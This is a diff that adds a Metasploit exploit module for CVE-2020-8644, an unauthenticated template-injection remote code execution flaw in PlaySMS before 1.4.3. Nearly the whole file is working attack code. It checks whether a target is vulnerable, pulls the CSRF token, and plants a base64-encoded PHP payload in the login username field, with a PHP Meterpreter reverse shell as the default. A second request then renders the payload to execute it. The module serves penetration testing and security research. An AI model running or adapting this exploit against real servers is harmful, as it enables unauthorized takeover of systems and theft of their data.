@@ -1,0 +1,153 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'PlaySMS index.php Unauthenticated Template Injection Code Execution',
+        'Description' => %q{
+          This module exploits a preauth Server-Side Template Injection vulnerability that leads to remote code execution
+          in PlaySMS before version 1.4.3. This issue is caused by double processing a server-side template with a custom
+          PHP template system called 'TPL' which is used in the PlaySMS template engine at
+          `src/Playsms/Tpl.php:_compile()`. The vulnerability is triggered when an attacker supplied username with a
+          malicious payload is submitted. This malicious payload is then stored in a TPL template which when rendered a
+          second time, results in code execution.
+          The TPL(https://github.com/antonraharja/tpl) template language is vulnerable to PHP code injection.
+
+          This module was tested against PlaySMS 1.4 on HackTheBox's Forlic Machine.
+        },
+        'Author' =>
+            [
+              'Touhid M.Shaikh <touhidshaikh22[at]gmail.com>', # Metasploit Module
+              'Lucas Rosevear' # Found and Initial PoC by NCC Group
+            ],
+        'License' => MSF_LICENSE,
+        'References' =>
+            [
+              ['CVE', '2020-8644'],
+              ['URL', 'https://www.youtube.com/watch?v=zu-bwoAtTrc'],
+              ['URL', 'https://research.nccgroup.com/2020/02/11/technical-advisory-playsms-pre-authentication-remote-code-execution-cve-2020-8644/']
+            ],
+        'DefaultOptions' =>
+            {
+              'SSL' => false,
+              'PAYLOAD' => 'php/meterpreter/reverse_tcp',
+              'ENCODER' => 'php/base64'
+            },
+        'Privileged' => false,
+        'Platform' => ['php'],
+        'Arch' => ARCH_PHP,
+        'Targets' =>
+            [
+              [ 'PlaySMS Before 1.4.3', {} ],
+            ],
+        'DefaultTarget' => 0,
+        'DisclosureDate' => '2020-02-05'
+      )
+      )
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [ true, 'Base playsms directory path', '/']),
+      ]
+    )
+  end
+
+  def uri
+    return target_uri.path
+  end
+
+  def check
+    begin
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri' => normalize_uri(uri, 'index.php')
+      })
+    rescue StandardError
+      vprint_error('Unable to access the index.php file')
+      return CheckCode::Unknown
+    end
+
+    if res.code == 302 && res.headers['Location'].include?('index.php?app=main&inc=core_auth&route=login')
+      return Exploit::CheckCode::Appears
+    end
+
+    return CheckCode::Safe
+  end
+
+  # Send Payload in Login Request
+  def login
+    res = send_request_cgi({
+      'uri' => normalize_uri(uri, 'index.php'),
+      'method' => 'GET',
+      'vars_get' => {
+        'app' => 'main',
+        'inc' => 'core_auth',
+        'route' => 'login'
+      }
+    })
+
+    # Grabbing CSRF token from body
+    /name="X-CSRF-Token" value="(?<csrf>[a-z0-9"]+)">/ =~ res.body
+    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine the CSRF token") if csrf.nil?
+    vprint_good("X-CSRF-Token for login : #{csrf}")
+
+    cookies = res.get_cookies
+
+    vprint_status('Trying to send the payload in the username field...')
+
+    # Encoded in base64 to avoid HTML TAGS which are filter by the Application which is also blocking semicolon(;), that is why we're using delete_suffix(';')
+    evil = "{{#{payload.encoded.delete_suffix(';')}}}"
+
+    # Send Payload with cookies.
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(uri, 'index.php'),
+      'cookie' => cookies,
+      'vars_get' => Hash[{
+        'app' => 'main',
+        'inc' => 'core_auth',
+        'route' => 'login',
+        'op' => 'login'
+      }.to_a.shuffle],
+      'vars_post' => Hash[{
+        'X-CSRF-Token' => csrf,
+        'username' => evil,
+        'password' => ''
+      }.to_a.shuffle]
+    })
+
+    fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to Login request") if res.nil?
+
+    # Request Status Check
+    if res.code == 302
+      print_good('Payload successfully sent')
+      return cookies
+    else
+      fail_with(Failure::UnexpectedReply, "#{peer} - Something went wrong")
+    end
+  end
+
+  def exploit
+    cookies = login
+    vprint_status("Cookies here : #{cookies}")
+    # Execute Last Sent Username.
+    send_request_cgi({
+      'uri' => normalize_uri(uri, 'index.php'),
+      'method' => 'GET',
+      'cookie' => cookies,
+      'vars_get' => {
+        'app' => 'main',
+        'inc' => 'core_auth',
+        'route' => 'login'
+      }
+    }, 0)
+  end
+end
